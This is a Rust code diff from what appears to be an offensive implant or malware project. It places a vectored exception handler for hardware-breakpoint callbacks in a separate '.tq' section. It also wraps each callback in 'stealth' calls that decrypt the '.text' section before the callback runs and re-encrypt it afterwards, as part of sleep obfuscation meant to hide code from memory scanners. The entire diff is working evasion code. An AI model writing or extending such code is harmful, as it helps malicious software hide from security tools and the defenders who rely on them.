@@ -221,6 +221,12 @@ mod platform {
         Ok(())
     }
 
+    /// VEH handler for HWBP dispatch.
+    ///
+    /// Lives in `.tq` so it remains executable when sleep obfuscation has
+    /// encrypted `.text`. Calls `wake()` before dispatching to callbacks
+    /// (which may touch `.text` code) and `sleep()` after.
+    #[unsafe(link_section = ".tq")]
     unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
         let info = unsafe { &*exception_info };
         let record = unsafe { &*info.ExceptionRecord };
@@ -242,7 +248,13 @@ mod platform {
                 let callback: HwbpCallback = unsafe { std::mem::transmute(cb_ptr) };
                 context.Dr6 &= !(1u64 << i);
                 context.EFlags |= 1 << 16;
+
+                // Decrypt .text before callback can touch any .text code.
+                crate::stealth::wake();
                 let handled = callback(exception_info as *mut ());
+                // Re-encrypt .text after all .text code is done.
+                crate::stealth::sleep();
+
                 if handled {
                     return EXCEPTION_CONTINUE_EXECUTION;
                 }
